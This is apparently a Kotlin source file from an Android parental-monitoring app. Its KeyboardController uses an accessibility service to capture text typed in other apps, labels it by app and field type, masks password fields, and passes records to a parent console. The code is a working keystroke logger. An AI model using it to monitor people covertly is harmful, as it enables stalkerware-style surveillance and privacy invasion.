package com.nexus.child.components.keyboard

import android.content.Context
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.util.LruCache
import android.view.accessibility.AccessibilityEvent
import com.nexus.child.accessibility.NexusAccessibilityService
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentLinkedDeque
import java.util.concurrent.atomic.AtomicInteger

/**
 * Production-grade KeyboardController for tracking keystrokes, typing sessions, and input field changes.
 *
 * Hey friend! Here is how this industrial controller works:
 * 1. Debouncing: Rather than spamming the parent console on each individual keypress, it buffers text
 *    and delays dispatching by 1500ms of typing inactivity.
 * 2. Instant Flush on Context Change: If the child shifts focus to a new view (TYPE_VIEW_FOCUSED) or
 *    switches to a different application (TYPE_WINDOW_STATE_CHANGED), it commits the active buffer immediately.
 * 3. Dynamic App Name Resolution: Resolves human-readable application labels (e.g., "WhatsApp", "Chrome")
 *    using Android's PackageManager, backed by an in-memory LRU cache.
 * 4. Password Protection: Strictly detects password/PIN fields and replaces the contents with masked dots
 *    ("••••••••") while setting isPassword = true to protect child safety and credentials.
 * 5. In-Memory Ring Buffer: Caches the last 100 entries so new parent connections receive a quick session snapshot.
 */
class KeyboardController(
    private val context: Context,
    private val scope: CoroutineScope = CoroutineScope(Dispatchers.Default + SupervisorJob()),
    private val debounceDelayMs: Long = DEFAULT_DEBOUNCE_DELAY_MS
) : IKeyboardController, NexusAccessibilityService.IAccessibilityKeyboardListener {

    companion object {
        private const val TAG = "KeyboardController"
        const val DEFAULT_DEBOUNCE_DELAY_MS = 1500L
        const val MAX_RING_BUFFER_SIZE = 100
        const val MASKED_PASSWORD_PLACEHOLDER = "••••••••"

        // Packages to ignore by default (e.g., system keyboards or self)
        private val IGNORED_PACKAGES = setOf(
            "com.google.android.inputmethod.latin", // Gboard
            "com.touchtype.swiftkey",               // SwiftKey
            "com.samsung.android.honeyboard"        // Samsung Keyboard
        )
    }

    @Volatile
    private var isMonitoringActive: Boolean = false

    private var onKeystrokeCallback: ((KeyboardRecord) -> Unit)? = null

    // App label LRU cache (capacity 100 packages)
    private val appLabelCache = LruCache<String, String>(100)

    // In-memory bounded ring buffer
    private val ringBuffer = ConcurrentLinkedDeque<KeyboardRecord>()

    // Sequence counter for generating unique IDs
    private val idCounter = AtomicInteger(1)

    // Active typing session state
    private val lock = Any()
    private var activeFieldKey: String? = null
    private var activePackageName: String? = null
    private var activeText: String? = null
    private var activeFieldHint: String? = null
    private var activeFieldId: String? = null
    private var activeInputType: String = "TEXT"
    private var activeIsPassword: Boolean = false
    private var lastDispatchedText: String? = null

    private var debounceJob: Job? = null

    override fun hasAccessibilityPermission(): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabledServices.contains(context.packageName)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility permission: ${e.message}", e)
            false
        }
    }

    override fun isMonitoring(): Boolean {
        return isMonitoringActive
    }

    override fun startMonitoring(onKeystroke: (KeyboardRecord) -> Unit): Boolean {
        if (!hasAccessibilityPermission()) {
            Log.w(TAG, "Cannot start keyboard monitoring: Accessibility permission is not granted")
            return false
        }

        if (isMonitoringActive) {
            Log.d(TAG, "Keyboard monitoring is already active")
            return true
        }

        Log.d(TAG, "Starting keyboard monitoring...")
        this.onKeystrokeCallback = onKeystroke
        this.isMonitoringActive = true

        // Register self as the active listener with the system Accessibility Service
        NexusAccessibilityService.setKeyboardEventListener(this)

        Log.d(TAG, "Keyboard monitoring started successfully")
        return true
    }

    override fun stopMonitoring(): Boolean {
        if (!isMonitoringActive) {
            Log.d(TAG, "Keyboard monitoring is already stopped")
            return false
        }

        Log.d(TAG, "Stopping keyboard monitoring...")

        // Flush any pending text before halting
        synchronized(lock) {
            debounceJob?.cancel()
            debounceJob = null
            flushBufferLocked()
        }

        NexusAccessibilityService.setKeyboardEventListener(null)
        this.onKeystrokeCallback = null
        this.isMonitoringActive = false

        Log.d(TAG, "Keyboard monitoring stopped successfully")
        return true
    }

    override fun getRecentRecords(): List<KeyboardRecord> {
        return ringBuffer.toList()
    }

    /**
     * Intercepts accessibility events dispatched from NexusAccessibilityService.
     */
    override fun onKeyboardAccessibilityEvent(event: AccessibilityEvent) {
        if (!isMonitoringActive) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChangedEvent(event)
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handleViewFocusedEvent(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWindowStateChangedEvent(event)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing keyboard accessibility event: ${e.message}", e)
        }
    }

    /**
     * Handles typing in an active text input field.
     */
    private fun handleTextChangedEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (shouldIgnorePackage(pkg)) return

        val text = event.text?.joinToString("") ?: ""
        if (text.isBlank()) return

        val source = event.source
        val fieldId = try {
            source?.viewIdResourceName
        } catch (_: Exception) {
            null
        }

        val fieldHint = source?.hintText?.toString()
        val rawInputType = source?.inputType ?: 0

        // Strict password detection
        val isPassword = event.isPassword ||
                (source != null && source.isPassword) ||
                isPasswordField(rawInputType)

        val inputTypeCategory = classifyInputType(rawInputType, isPassword)
        val fieldKey = "$pkg:${fieldId ?: "default_field"}"

        synchronized(lock) {
            // If the user changed to a different field before debounce fired, flush the previous one
            if (activeFieldKey != null && activeFieldKey != fieldKey) {
                flushBufferLocked()
            }

            // Update active session buffer
            activeFieldKey = fieldKey
            activePackageName = pkg
            activeText = text
            activeFieldHint = fieldHint
            activeFieldId = fieldId
            activeInputType = inputTypeCategory
            activeIsPassword = isPassword

            // Reset the debounce timer
            debounceJob?.cancel()
            debounceJob = scope.launch {
                delay(debounceDelayMs)
                synchronized(lock) {
                    flushBufferLocked()
                }
            }
        }
    }

    /**
     * When user shifts focus to a new view, immediately commit any unfinished input.
     */
    private fun handleViewFocusedEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (shouldIgnorePackage(pkg)) return

        val fieldId = try {
            event.source?.viewIdResourceName
        } catch (_: Exception) {
            null
        }
        val focusedFieldKey = "$pkg:${fieldId ?: "default_field"}"

        synchronized(lock) {
            if (activeFieldKey != null && activeFieldKey != focusedFieldKey) {
                debounceJob?.cancel()
                debounceJob = null
                flushBufferLocked()
            }
        }
    }

    /**
     * When the user leaves an app or switches windows, immediately flush any buffered text.
     */
    private fun handleWindowStateChangedEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (shouldIgnorePackage(pkg)) return

        synchronized(lock) {
            if (activeFieldKey != null && activePackageName != pkg) {
                debounceJob?.cancel()
                debounceJob = null
                flushBufferLocked()
            }
        }
    }

    /**
     * Flushes the active typing buffer into a completed KeyboardRecord.
     * Must be called while holding [lock].
     */
    private fun flushBufferLocked() {
        val text = activeText ?: return
        val pkg = activePackageName ?: return

        // Prevent echoing duplicate records if the content hasn't changed
        if (text == lastDispatchedText && !activeIsPassword) {
            resetActiveBufferLocked()
            return
        }

        val appName = getApplicationLabel(pkg)
        val finalText = if (activeIsPassword) MASKED_PASSWORD_PLACEHOLDER else text.trim()

        if (finalText.isNotBlank()) {
            val record = KeyboardRecord(
                id = "${System.currentTimeMillis()}_${idCounter.getAndIncrement()}",
                app = pkg,
                appName = appName,
                text = finalText,
                fieldHint = activeFieldHint,
                fieldId = activeFieldId,
                inputType = activeInputType,
                isPassword = activeIsPassword,
                timestamp = System.currentTimeMillis()
            )

            // Cache in bounded ring buffer
            if (ringBuffer.size >= MAX_RING_BUFFER_SIZE) {
                ringBuffer.pollFirst()
            }
            ringBuffer.addLast(record)

            lastDispatchedText = text
            onKeystrokeCallback?.invoke(record)
            Log.d(TAG, "Dispatched keyboard record for $appName ($pkg): ${record.inputType}")
        }

        resetActiveBufferLocked()
    }

    /**
     * Clears internal active buffer properties.
     */
    private fun resetActiveBufferLocked() {
        activeFieldKey = null
        activePackageName = null
        activeText = null
        activeFieldHint = null
        activeFieldId = null
        activeInputType = "TEXT"
        activeIsPassword = false
    }

    /**
     * Dynamically resolves the human-readable app label with LRU caching.
     */
    fun getApplicationLabel(packageName: String): String {
        appLabelCache.get(packageName)?.let { return it }

        val resolved = try {
            val pm = context.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            packageName
        }

        appLabelCache.put(packageName, resolved)
        return resolved
    }

    /**
     * Evaluates whether a package should be ignored to avoid logging internal system keyboard loops.
     */
    private fun shouldIgnorePackage(packageName: String): Boolean {
        if (packageName == context.packageName) return true
        return IGNORED_PACKAGES.contains(packageName)
    }

    /**
     * Detects password input types based on Android InputType bitmasks.
     */
    fun isPasswordField(inputType: Int): Boolean {
        val passwordVariations = listOf(
            InputType.TYPE_TEXT_VARIATION_PASSWORD,
            InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD,
            InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD,
            InputType.TYPE_NUMBER_VARIATION_PASSWORD
        )

        val variation = inputType and InputType.TYPE_MASK_VARIATION
        return passwordVariations.contains(variation)
    }

    /**
     * Classifies raw input type integer into human-readable categories.
     */
    fun classifyInputType(inputType: Int, isPassword: Boolean): String {
        if (isPassword) return "PASSWORD"

        val variation = inputType and InputType.TYPE_MASK_VARIATION
        val inputClass = inputType and InputType.TYPE_MASK_CLASS

        return when {
            variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS ||
                    variation == InputType.TYPE_TEXT_VARIATION_WEB_EMAIL_ADDRESS -> "EMAIL"
            variation == InputType.TYPE_TEXT_VARIATION_URI -> "URL"
            inputClass == InputType.TYPE_CLASS_PHONE -> "PHONE"
            inputClass == InputType.TYPE_CLASS_NUMBER -> "NUMBER"
            variation == InputType.TYPE_TEXT_VARIATION_SHORT_MESSAGE -> "MESSAGE"
            (inputType and InputType.TYPE_TEXT_FLAG_MULTI_LINE) != 0 -> "MULTILINE"
            else -> "TEXT"
        }
    }

    override fun cleanup() {
        stopMonitoring()
        ringBuffer.clear()
        appLabelCache.evictAll()
        scope.cancel()
    }
}
